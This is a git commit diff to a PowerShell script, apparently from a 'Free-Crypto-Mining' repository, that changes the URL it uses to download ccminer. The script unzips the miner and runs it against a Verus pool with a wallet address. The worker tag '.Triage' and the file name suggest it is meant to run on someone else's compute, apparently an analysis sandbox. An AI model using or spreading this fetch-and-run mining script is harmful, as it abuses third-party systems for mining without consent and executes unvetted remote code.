912123d6866ca5167ef3deebe62cf3e169cf552c
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2024-07-13 19:07:31 +0200

    Update triage.ps1

--- verus/triage.ps1
+++ verus/triage.ps1
@@ -4,7 +4,7 @@ $server = "stratum+tcp://us.vipor.net:5040"
 $user = "RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Triage"
 $password = "x"
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/ccminer-windows.zip" -OutFile "ccminer.zip"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/ccminer-win.zip" -OutFile "ccminer.zip"
 Expand-Archive ccminer.zip
 
 $command = ".\ccminer\ccminer.exe -a $algorithm -o $server -u $user -p $password -t $threads"
